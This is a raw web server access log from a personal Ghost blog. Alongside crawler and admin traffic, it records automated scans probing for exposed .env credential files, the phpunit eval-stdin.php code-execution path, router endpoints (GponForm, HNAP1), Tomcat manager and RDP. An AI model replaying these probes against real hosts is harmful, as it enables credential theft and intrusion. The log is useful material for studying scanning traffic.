206.189.88.12 - - [23/Jan/2022:23:29:49 +0100] "GET /audio/.env HTTP/1.1" 301 162 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.183 Safari/537.36"
206.189.88.12 - - [23/Jan/2022:23:29:49 +0100] "GET /cgi-bin/.env HTTP/1.1" 301 162 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.183 Safari/537.36"
206.189.88.12 - - [23/Jan/2022:23:29:50 +0100] "GET /backend/.env HTTP/1.1" 301 162 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.183 Safari/537.36"
206.189.88.12 - - [23/Jan/2022:23:29:50 +0100] "GET /src/.env HTTP/1.1" 301 162 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.183 Safari/537.36"
206.189.88.12 - - [23/Jan/2022:23:29:51 +0100] "GET /base/.env HTTP/1.1" 301 162 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.183 Safari/537.36"
206.189.88.12 - - [23/Jan/2022:23:29:51 +0100] "GET /core/.env HTTP/1.1" 301 162 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.183 Safari/537.36"
206.189.88.12 - - [23/Jan/2022:23:29:52 +0100] "GET /vendor/laravel/.env HTTP/1.1" 301 162 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.183 Safari/537.36"
206.189.88.12 - - [23/Jan/2022:23:29:52 +0100] "GET /storage/.env HTTP/1.1" 301 162 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.183 Safari/537.36"
206.189.88.12 - - [23/Jan/2022:23:29:53 +0100] "GET /protected/.env HTTP/1.1" 301 162 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.183 Safari/537.36"
206.189.88.12 - - [23/Jan/2022:23:29:53 +0100] "GET /newsite/.env HTTP/1.1" 301 162 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.183 Safari/537.36"
206.189.88.12 - - [23/Jan/2022:23:29:54 +0100] "GET /www/.env HTTP/1.1" 301 162 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.183 Safari/537.36"
206.189.88.12 - - [23/Jan/2022:23:29:54 +0100] "GET /sites/all/libraries/mailchimp/.env HTTP/1.1" 301 162 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.183 Safari/537.36"
206.189.88.12 - - [23/Jan/2022:23:29:55 +0100] "GET /database/.env HTTP/1.1" 301 162 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.183 Safari/537.36"
206.189.88.12 - - [23/Jan/2022:23:29:55 +0100] "GET /public/.env HTTP/1.1" 301 162 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.183 Safari/537.36"
206.189.88.12 - - [23/Jan/2022:23:29:56 +0100] "GET /106.1.forpsi.net/.env HTTP/1.1" 301 162 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.183 Safari/537.36"
206.189.88.12 - - [23/Jan/2022:23:29:57 +0100] "POST / HTTP/1.1" 301 162 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.183 Safari/537.36"
206.189.88.12 - - [23/Jan/2022:23:29:57 +0100] "GET /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 301 162 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.183 Safari/537.36"
40.77.167.36 - - [23/Jan/2022:23:44:17 +0100] "GET / HTTP/2.0" 200 13159 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
136.144.41.117 - - [24/Jan/2022:00:05:39 +0100] "GET / HTTP/1.1" 301 162 "-" "Linux Gnu (cow)"
125.64.94.140 - - [24/Jan/2022:00:51:56 +0100] "GET / HTTP/1.0" 200 1345 "-" "-"
125.64.94.140 - - [24/Jan/2022:00:51:57 +0100] "GET /favicon.ico HTTP/1.1" 200 595 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4 240.111 Safari/537.36"
125.64.94.140 - - [24/Jan/2022:00:51:58 +0100] "GET /robots.txt HTTP/1.1" 200 595 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4 240.111 Safari/537.36"
125.64.94.140 - - [24/Jan/2022:00:52:00 +0100] "GET /.well-known/security.txt HTTP/1.1" 200 595 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4 240.111 Safari/537.36"
109.237.103.38 - - [24/Jan/2022:00:52:52 +0100] "GET /.env HTTP/1.1" 400 650 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
109.237.103.38 - - [24/Jan/2022:00:52:53 +0100] "GET /.env HTTP/1.1" 200 595 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
185.196.220.62 - - [24/Jan/2022:00:54:28 +0100] "POST /GponForm/diag_Form?script/ HTTP/1.1" 301 162 "-" "Hello, World"
3.237.183.177 - - [24/Jan/2022:00:56:48 +0100] "GET /rss HTTP/1.1" 301 5 "-" "Forem Feeds Importer"
3.237.183.177 - - [24/Jan/2022:00:56:49 +0100] "GET /rss/ HTTP/1.1" 200 3448 "-" "Forem Feeds Importer"
107.189.29.181 - - [24/Jan/2022:01:02:54 +0100] "GET / HTTP/1.1" 301 162 "-" "-"
107.189.29.181 - - [24/Jan/2022:01:02:55 +0100] "POST /HNAP1/ HTTP/1.1" 301 162 "-" "Mozila/5.0"
192.241.211.246 - - [24/Jan/2022:01:16:07 +0100] "GET /manager/html HTTP/1.1" 301 162 "-" "Mozilla/5.0 zgrab/0.x"
143.110.222.104 - - [24/Jan/2022:01:34:39 +0100] "GET / HTTP/1.0" 301 162 "-" "-"
45.61.172.7 - - [24/Jan/2022:01:53:04 +0100] "GET /.env HTTP/1.1" 301 162 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
45.61.172.7 - - [24/Jan/2022:01:53:04 +0100] "POST / HTTP/1.1" 301 162 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
45.61.172.7 - - [24/Jan/2022:01:53:05 +0100] "GET /.env HTTP/1.1" 200 595 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
45.61.172.7 - - [24/Jan/2022:01:53:05 +0100] "POST / HTTP/1.1" 405 552 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
125.64.94.140 - - [24/Jan/2022:02:23:23 +0100] "GET / HTTP/1.0" 200 1345 "-" "-"
125.64.94.140 - - [24/Jan/2022:02:23:24 +0100] "GET /favicon.ico HTTP/1.1" 200 595 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4 240.111 Safari/537.36"
125.64.94.140 - - [24/Jan/2022:02:23:25 +0100] "GET /robots.txt HTTP/1.1" 200 595 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4 240.111 Safari/537.36"
125.64.94.140 - - [24/Jan/2022:02:23:26 +0100] "GET /.well-known/security.txt HTTP/1.1" 200 595 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4 240.111 Safari/537.36"
3.101.139.34 - - [24/Jan/2022:02:40:12 +0100] "GET / HTTP/1.1" 200 595 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.102 Safari/537.36"
8.45.145.16 - - [24/Jan/2022:03:00:01 +0100] "GET / HTTP/1.1" 301 162 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36"
8.45.145.16 - - [24/Jan/2022:03:00:02 +0100] "GET / HTTP/1.1" 200 595 "http://85.255.1.106" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36"
8.45.145.16 - - [24/Jan/2022:03:00:02 +0100] "GET /favicon.ico HTTP/1.1" 301 162 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36"
8.45.145.16 - - [24/Jan/2022:03:00:03 +0100] "GET /favicon.ico HTTP/1.1" 200 595 "http://85.255.1.106/favicon.ico" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36"
40.77.167.105 - - [24/Jan/2022:03:02:30 +0100] "GET /robots.txt HTTP/1.1" 301 162 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
40.77.167.105 - - [24/Jan/2022:03:02:30 +0100] "GET /robots.txt HTTP/2.0" 200 108 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
157.55.39.214 - - [24/Jan/2022:03:02:38 +0100] "GET / HTTP/1.1" 301 162 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
192.241.213.239 - - [24/Jan/2022:03:02:48 +0100] "GET / HTTP/1.1" 301 162 "-" "Mozilla/5.0 zgrab/0.x"
64.62.197.182 - - [24/Jan/2022:03:15:46 +0100] "GET / HTTP/1.1" 200 1345 "-" "-"
66.249.69.57 - - [24/Jan/2022:03:47:16 +0100] "GET /robots.txt HTTP/1.1" 200 108 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.69.57 - - [24/Jan/2022:03:47:16 +0100] "GET /sitemap-authors.xml HTTP/1.1" 200 344 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
40.77.167.36 - - [24/Jan/2022:03:51:35 +0100] "GET / HTTP/2.0" 200 13159 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
34.222.200.236 - - [24/Jan/2022:03:58:08 +0100] "GET / HTTP/1.1" 301 162 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.102 Safari/537.36"
192.241.211.250 - - [24/Jan/2022:04:09:55 +0100] "GET /manager/html HTTP/1.1" 400 248 "-" "Mozilla/5.0 zgrab/0.x"
40.77.167.105 - - [24/Jan/2022:04:18:57 +0100] "GET /robots.txt HTTP/1.1" 301 162 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
40.77.167.105 - - [24/Jan/2022:04:18:58 +0100] "GET /robots.txt HTTP/2.0" 200 108 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
157.55.39.214 - - [24/Jan/2022:04:19:05 +0100] "GET / HTTP/1.1" 301 162 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
157.55.39.9 - - [24/Jan/2022:04:45:48 +0100] "GET /sitemap-authors.xml HTTP/2.0" 200 344 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
45.137.21.134 - - [24/Jan/2022:05:39:55 +0100] "GET /dispatch.asp HTTP/1.1" 301 162 "-" "Mozilla/5.0 (iPad; CPU OS 7_1_2 like Mac OS X; en-US) AppleWebKit/531.5.2 (KHTML, like Gecko) Version/4.0.5 Mobile/8B116 Safari/6531.5.2"
35.175.178.233 - - [24/Jan/2022:05:58:52 +0100] "GET /rss HTTP/1.1" 301 5 "-" "Forem Feeds Importer"
35.175.178.233 - - [24/Jan/2022:05:58:53 +0100] "GET /rss/ HTTP/1.1" 200 3443 "-" "Forem Feeds Importer"
192.241.212.102 - - [24/Jan/2022:06:28:29 +0100] "GET / HTTP/1.1" 200 595 "-" "Mozilla/5.0 zgrab/0.x"
118.123.105.68 - - [24/Jan/2022:07:17:17 +0100] "GET / HTTP/1.0" 301 162 "-" "-"
118.123.105.68 - - [24/Jan/2022:07:17:19 +0100] "GET / HTTP/1.1" 301 162 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4 240.111 Safari/537.36"
118.123.105.68 - - [24/Jan/2022:07:17:20 +0100] "GET / HTTP/1.1" 200 595 "http://85.255.1.106" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4 240.111 Safari/537.36"
118.123.105.68 - - [24/Jan/2022:07:17:20 +0100] "GET /favicon.ico HTTP/1.1" 301 162 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4 240.111 Safari/537.36"
118.123.105.68 - - [24/Jan/2022:07:17:21 +0100] "GET /favicon.ico HTTP/1.1" 200 595 "http://85.255.1.106/favicon.ico" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4 240.111 Safari/537.36"
118.123.105.68 - - [24/Jan/2022:07:17:22 +0100] "GET /robots.txt HTTP/1.1" 301 162 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4 240.111 Safari/537.36"
118.123.105.68 - - [24/Jan/2022:07:17:47 +0100] "GET /robots.txt/ HTTP/1.1" 301 162 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4 240.111 Safari/537.36"
118.123.105.68 - - [24/Jan/2022:07:17:48 +0100] "GET /robots.txt/ HTTP/1.1" 200 595 "http://85.255.1.106/robots.txt/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4 240.111 Safari/537.36"
118.123.105.68 - - [24/Jan/2022:07:17:49 +0100] "GET /.well-known/security.txt HTTP/1.1" 301 162 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4 240.111 Safari/537.36"
118.123.105.68 - - [24/Jan/2022:07:17:50 +0100] "GET /.well-known/security.txt HTTP/1.1" 200 595 "http://85.255.1.106/.well-known/security.txt" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4 240.111 Safari/537.36"
199.127.61.114 - - [24/Jan/2022:07:20:00 +0100] "GET / HTTP/1.1" 301 162 "-" "-"
199.127.61.114 - - [24/Jan/2022:07:20:15 +0100] "POST /HNAP1/ HTTP/1.1" 301 162 "-" "Mozila/5.0"
47.242.251.185 - - [24/Jan/2022:07:27:44 +0100] "GET / HTTP/1.0" 301 162 "-" "-"
47.242.251.185 - - [24/Jan/2022:07:27:45 +0100] "GET /text4041643005665 HTTP/1.1" 301 162 "-" "Mozilla/5.0 (compatible;)"
47.242.251.185 - - [24/Jan/2022:07:27:45 +0100] "GET / HTTP/1.0" 301 162 "-" "-"
47.242.251.185 - - [24/Jan/2022:07:27:46 +0100] "POST /sdk HTTP/1.1" 301 162 "-" "Mozilla/5.0 (compatible;)"
47.242.251.185 - - [24/Jan/2022:07:27:46 +0100] "GET / HTTP/1.1" 301 162 "-" "-"
47.242.251.185 - - [24/Jan/2022:07:27:46 +0100] "GET /evox/about HTTP/1.1" 301 162 "-" "Mozilla/5.0 (compatible;)"
47.242.251.185 - - [24/Jan/2022:07:27:48 +0100] "GET /HNAP1 HTTP/1.1" 301 162 "-" "Mozilla/5.0 (compatible;)"
47.242.251.185 - - [24/Jan/2022:07:27:56 +0100] "\x16\x03\x01\x02\x00\x01\x00\x01\xFC\x03\x03;|\xD7`\xBD\x7F\xDB`\xE6\xBB\xE8\x04\x8B\xE6\x1B\x04\xBF>\x05\xE5\xD0\x02y%\xE5\x19\xA1ge\xCEy\xA2\x00\x00\xDA\x00\x05\x00\x04\x00\x02\x00\x01\x00\x16\x003\x009\x00:\x00\x18\x005\x00" 400 150 "-" "-"
47.242.251.185 - - [24/Jan/2022:07:27:57 +0100] "\x16\x03\x01\x02\x00\x01\x00\x01\xFC\x03\x03|\xB7\xEA\x09\xB0\xBD\x11V\xFC'\xF6|_X\x03e\xC8=\x1FR\x99\x93\xE8\x08^U\xDA\xF5S\xB2\xC4\x9E\x00\x00\xDA\x00\x05\x00\x04\x00\x02\x00\x01\x00\x16\x003\x009\x00:\x00\x18\x005\x00" 400 150 "-" "-"
47.242.251.185 - - [24/Jan/2022:07:28:01 +0100] "GET / HTTP/1.1" 301 162 "-" "curl/7.75.0"
47.242.251.185 - - [24/Jan/2022:07:28:02 +0100] "GET / HTTP/1.1" 200 595 "-" "curl/7.75.0"
47.242.251.185 - - [24/Jan/2022:07:28:02 +0100] "GET /favicon.ico HTTP/1.1" 301 162 "-" "curl/7.75.0"
47.242.251.185 - - [24/Jan/2022:07:28:03 +0100] "GET /favicon.ico HTTP/1.1" 200 595 "-" "curl/7.75.0"
47.242.251.185 - - [24/Jan/2022:07:28:04 +0100] "GET /robots.txt HTTP/1.1" 301 162 "-" "curl/7.75.0"
47.242.251.185 - - [24/Jan/2022:07:28:05 +0100] "GET /robots.txt HTTP/1.1" 200 595 "-" "curl/7.75.0"
109.237.103.118 - - [24/Jan/2022:07:35:16 +0100] "GET /.env HTTP/1.1" 400 650 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
109.237.103.118 - - [24/Jan/2022:07:35:16 +0100] "GET /.env HTTP/1.1" 200 595 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
185.196.220.54 - - [24/Jan/2022:07:44:35 +0100] "HEAD / HTTP/1.0" 301 0 "-" "-"
101.83.226.106 - - [24/Jan/2022:08:10:24 +0100] "GET / HTTP/1.1" 301 162 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
212.83.148.16 - - [24/Jan/2022:08:13:05 +0100] "GET / HTTP/1.0" 301 162 "-" "masscan/1.3 (https://github.com/robertdavidgraham/masscan)"
143.110.211.193 - - [24/Jan/2022:08:37:27 +0100] "\x16\x03\x01\x01\xFB\x01\x00\x01\xF7\x03\x03\xD4\xCEo< \xB1\x0C\xD9\xF8=B\x8Em\x10\xB6\x8FV\xA7\x913E\x9A\x85I\x22R'\xB3\xF3\x92\xCC\xA1\x00\x01<\xCC\x14\xCC\x13\xCC\x15\xC00\xC0,\xC0(\xC0$\xC0\x14\xC0" 400 150 "-" "-"
125.64.94.140 - - [24/Jan/2022:08:52:08 +0100] "GET / HTTP/1.0" 301 162 "-" "-"
125.64.94.140 - - [24/Jan/2022:08:52:10 +0100] "GET / HTTP/1.1" 301 162 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4 240.111 Safari/537.36"
125.64.94.140 - - [24/Jan/2022:08:52:11 +0100] "GET / HTTP/1.1" 200 595 "http://85.255.1.106" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4 240.111 Safari/537.36"
125.64.94.140 - - [24/Jan/2022:08:52:38 +0100] "GET /favicon.ico/ HTTP/1.1" 301 162 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4 240.111 Safari/537.36"
125.64.94.140 - - [24/Jan/2022:08:52:41 +0100] "GET /favicon.ico/ HTTP/1.1" 200 595 "http://85.255.1.106/favicon.ico/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4 240.111 Safari/537.36"
125.64.94.140 - - [24/Jan/2022:08:52:41 +0100] "GET /robots.txt HTTP/1.1" 301 162 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4 240.111 Safari/537.36"
125.64.94.140 - - [24/Jan/2022:08:52:42 +0100] "GET /robots.txt HTTP/1.1" 200 595 "http://85.255.1.106/robots.txt" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4 240.111 Safari/537.36"
125.64.94.140 - - [24/Jan/2022:08:53:09 +0100] "GET /.well-known/security.txt/ HTTP/1.1" 301 162 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4 240.111 Safari/537.36"
125.64.94.140 - - [24/Jan/2022:08:53:10 +0100] "GET /.well-known/security.txt/ HTTP/1.1" 200 595 "http://85.255.1.106/.well-known/security.txt/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4 240.111 Safari/537.36"
66.249.69.57 - - [24/Jan/2022:08:59:40 +0100] "GET /robots.txt HTTP/1.1" 200 108 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.69.61 - - [24/Jan/2022:08:59:41 +0100] "GET /weekly-stories-3/ HTTP/1.1" 200 15610 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
45.137.21.134 - - [24/Jan/2022:09:02:13 +0100] "GET /dispatch.asp HTTP/1.1" 301 162 "-" "Mozilla/5.0 (iPad; CPU OS 7_1_2 like Mac OS X; en-US) AppleWebKit/531.5.2 (KHTML, like Gecko) Version/4.0.5 Mobile/8B116 Safari/6531.5.2"
40.77.167.36 - - [24/Jan/2022:09:03:49 +0100] "GET / HTTP/2.0" 200 13159 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
66.249.69.61 - - [24/Jan/2022:09:07:43 +0100] "GET /sitemap-tags.xml HTTP/1.1" 200 458 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
185.156.72.27 - - [24/Jan/2022:09:26:13 +0100] "\x03\x00\x00/*\xE0\x00\x00\x00\x00\x00Cookie: mstshash=Administr" 400 150 "-" "-"
185.156.72.27 - - [24/Jan/2022:09:26:13 +0100] "\x03\x00\x00/*\xE0\x00\x00\x00\x00\x00Cookie: mstshash=Administr" 400 150 "-" "-"
66.249.69.41 - - [24/Jan/2022:09:29:40 +0100] "GET /robots.txt HTTP/1.1" 301 162 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.69.41 - - [24/Jan/2022:09:29:40 +0100] "GET / HTTP/1.1" 301 162 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.69.61 - - [24/Jan/2022:09:29:42 +0100] "GET / HTTP/1.1" 200 13172 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
91.243.167.105 - - [24/Jan/2022:09:34:57 +0100] "GET / HTTP/1.1" 301 162 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36"
184.105.139.69 - - [24/Jan/2022:09:54:29 +0100] "GET / HTTP/1.1" 301 162 "-" "-"
83.29.176.162 - - [24/Jan/2022:10:07:18 +0100] "GET /ghost/ HTTP/2.0" 200 1553 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36 OPR/83.0.4254.19"
83.29.176.162 - - [24/Jan/2022:10:07:19 +0100] "GET /ghost/api/canary/admin/users/me/?include=roles HTTP/2.0" 200 755 "https://krzwiatrzyk.eu/ghost/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36 OPR/83.0.4254.19"
83.29.176.162 - - [24/Jan/2022:10:07:19 +0100] "GET /ghost/api/canary/admin/site/ HTTP/2.0" 200 339 "https://krzwiatrzyk.eu/ghost/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36 OPR/83.0.4254.19"
83.29.176.162 - - [24/Jan/2022:10:07:19 +0100] "GET /ghost/api/canary/admin/config/ HTTP/2.0" 200 239 "https://krzwiatrzyk.eu/ghost/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36 OPR/83.0.4254.19"
83.29.176.162 - - [24/Jan/2022:10:07:19 +0100] "GET /ghost/api/canary/admin/settings/?group=site%2Ctheme%2Cprivate%2Cmembers%2Cportal%2Cnewsletter%2Cemail%2Camp%2Clabs%2Cslack%2Cunsplash%2Cviews%2Cfirstpromoter%2Coauth%2Ceditor HTTP/2.0" 200 1857 "https://krzwiatrzyk.eu/ghost/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36 OPR/83.0.4254.19"
83.29.176.162 - - [24/Jan/2022:10:07:19 +0100] "GET /ghost/api/canary/admin/notifications/ HTTP/2.0" 200 378 "https://krzwiatrzyk.eu/ghost/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36 OPR/83.0.4254.19"
83.29.176.162 - - [24/Jan/2022:10:07:19 +0100] "GET /ghost/api/canary/admin/pages/?limit=30&page=1&filter=status%3A%5Bdraft%2Cscheduled%2Cpublished%2Csent%5D HTTP/2.0" 200 1711 "https://krzwiatrzyk.eu/ghost/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36 OPR/83.0.4254.19"
83.29.176.162 - - [24/Jan/2022:10:07:19 +0100] "GET /ghost/api/canary/admin/members/stats/count/ HTTP/2.0" 200 42 "https://krzwiatrzyk.eu/ghost/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36 OPR/83.0.4254.19"
83.29.176.162 - - [24/Jan/2022:10:07:19 +0100] "GET /ghost/api/canary/admin/tags/?limit=all HTTP/2.0" 200 397 "https://krzwiatrzyk.eu/ghost/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36 OPR/83.0.4254.19"
83.29.176.162 - - [24/Jan/2022:10:07:19 +0100] "GET /ghost/api/canary/admin/snippets/?limit=all HTTP/2.0" 200 106 "https://krzwiatrzyk.eu/ghost/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36 OPR/83.0.4254.19"
83.29.176.162 - - [24/Jan/2022:10:07:19 +0100] "GET /ghost/api/canary/admin/users/?limit=all&include=roles HTTP/2.0" 200 846 "https://krzwiatrzyk.eu/ghost/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36 OPR/83.0.4254.19"
